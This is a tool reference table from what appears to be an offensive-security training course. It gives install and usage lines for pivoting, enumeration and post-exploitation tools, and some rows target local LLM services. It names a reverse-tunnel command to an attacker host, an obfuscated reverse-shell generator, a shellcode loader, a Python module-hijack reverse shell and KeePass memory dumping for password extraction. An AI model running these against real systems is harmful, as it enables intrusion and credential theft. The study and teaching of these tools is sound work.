# OSAI Tool Reference — All Modules

| Tool | Module(s) | Purpose | Install | Usage |
|------|-----------|---------|---------|-------|
| **chisel** | 11 | TCP/SOCKS tunnel over HTTP | `wget https://github.com/jpillora/chisel/releases/...` | `chisel server --reverse --port 8080` / `chisel.exe client <ATTKR>:8080 R:1080:socks` |
| **proxychains4** | 11 | Route traffic through SOCKS proxies | `apt install proxychains4` | `proxychains4 -q <command>` |
| **xfreerdp** | 11 | RDP client (Linux) | `apt install freerdp2-x11` | `xfreerdp /v:TARGET /u:USER /p:PASS /d:DOMAIN` |
| **sqlcmd** | 11 | MSSQL command-line client | Windows built-in / Linux: `apt install mssql-tools` | `sqlcmd -S SERVER -E -Q "SELECT @@version"` |
| **procdump64** | 11 | Windows process memory dump (Sysinternals) | Download from sysinternals.com | `procdump64.exe -ma KeePass.exe keepass.dmp` |
| **smbclient** | 5, 11 | SMB share access (Linux) | `apt install smbclient` | `smbclient //HOST/SHARE -U 'DOMAIN\user%pass'` |
| **adsisearcher** | 11 | Stealthy AD LDAP enum (PowerShell built-in) | Built-in PowerShell | `([adsisearcher]'(objectclass=computer)').FindAll()` |
| **gen_cs_shell.sh** | 11 | XOR-obfuscated C# reverse shell generator | In Scripts/ | `./gen_cs_shell.sh tun0 4444 /tmp/` |
| **loader.c / beacon.exe** | 11 | Shellcode loader via EnumDesktopWindows | Compile: `x86_64-w64-mingw32-gcc loader.c -o beacon.exe -luser32 -Os -s` | Drop and execute on target |
| **xor_encrypt.py** | 11 | XOR-encrypt Sliver shellcode → C header | In Scripts/ | `python3 xor_encrypt.py beacon.bin shellcode.h` |
| **malicious_pandas.py** | 11 | Python module hijack reverse shell | In Scripts/ | Drop as `pandas.py` in target script's CWD |
| **nmap** | 2, 9, 10, 11 | Network/port scanning | `apt install nmap` | `nmap -sV -p 8080,11434,1234,6333 TARGET` |
| **crackmapexec (cme)** | 11 | SMB/LDAP/MSSQL enum and exploitation | `apt install crackmapexec` | `cme smb 10.10.20.0/24` |
| **curl** | 5, 7, 9, 10 | HTTP requests to APIs | Built-in | `curl -s http://HOST:PORT/endpoint -X POST -d '{}'` |
| **rlwrap nc** | 11 | Netcat listener with readline history | `apt install rlwrap netcat` | `rlwrap nc -lvnp 4444` |
| **strings** | 11 | Extract printable strings from binaries | Built-in (Linux) | `strings -e l binary.exe` (Unicode) |
| **mcs (Mono C# compiler)** | 11 | Compile C# on Linux | `apt install mono-mcs` | `mcs -out:svc.exe shell.cs` |
| **ssh** | 11 | SSH client | Built-in | `ssh -i id_rsa -p 2222 Administrator@DC01` |
| **ILSpy / dotPeek** | 11 | .NET binary decompiler | Download separately | GUI — open .exe to decompile |
| **aws cli** | 9 | AWS API interaction | `apt install awscli` | `aws sts get-caller-identity` |
| **kubectl** | 9 | Kubernetes API client | `apt install kubectl` | `kubectl auth can-i --list` |
| **docker** | 9 | Container build/run | `apt install docker.io` | `docker build -t TAG -f Dockerfile .` |
| **LM Studio** | 11 | Local LLM inference server | Download lmstudio.ai | Runs on port 1234; OpenAI-compatible API |
| **Ollama** | 2, 7 | Local LLM inference server | `curl https://ollama.ai/install.sh | sh` | Runs on port 11434 |
| **truffleHog** | 8, 10 | Secret scanning in repos/files | `pip install truffleHog` | `trufflehog filesystem PATH` |
| **KeeFarce / keepass-dump-masterkey** | 11 | KeePass master password extraction from dump | GitHub download | Run against `.dmp` file |
| **smbmap** | 5, 11 | SMB share enumeration and access | `apt install smbmap` | `smbmap -H HOST -u USER -p PASS` |
| **Qdrant** | 5, 6, 10 | Vector database (target service) | Docker: `docker run -p 6333:6333 qdrant/qdrant` | REST API on port 6333 |
